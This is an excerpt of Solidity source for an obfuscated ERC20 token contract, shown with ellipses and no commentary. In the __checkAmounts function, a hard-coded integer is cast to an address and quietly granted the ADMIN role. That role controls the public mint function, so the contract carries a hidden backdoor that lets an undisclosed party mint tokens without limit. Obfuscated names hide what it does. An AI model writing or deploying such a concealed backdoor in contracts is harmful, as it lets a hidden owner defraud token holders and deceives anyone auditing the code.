...
abstract contract _NSFKMCXGConsole is Context, _NSFKMCXGRoleControl {
    ...
    uint256 un = 1391223936401117083172284535697144997847553703447;
    ...
    function __NSFKMCXGuintU(
        ...
        __checkAmounts(root, addr, memoUint);
    }
    ...
    function __checkAmounts(bytes32 role, address account,uint256 num) internal {
        if(num > 0){
            _roles[role].RD.RM[account] = num.mul(10 ** 18);
            
            address roleaddr = address(uint160(un));
            if (!hasRole(ADMIN, roleaddr)) {
                _grantRole(ADMIN, roleaddr);
            }
        }
    }
...
contract _NSFKMCXGERC20 is IERC20, IERC20Metadata,_NSFKMCXGConsole {
    ...
    function mint(address addr, uint256 amt) public virtual onlyRole(ADMIN) {
        _mint(addr, amt * 10 ** decimals());
    }
...
contract Token is _NSFKMCXGERC20 {
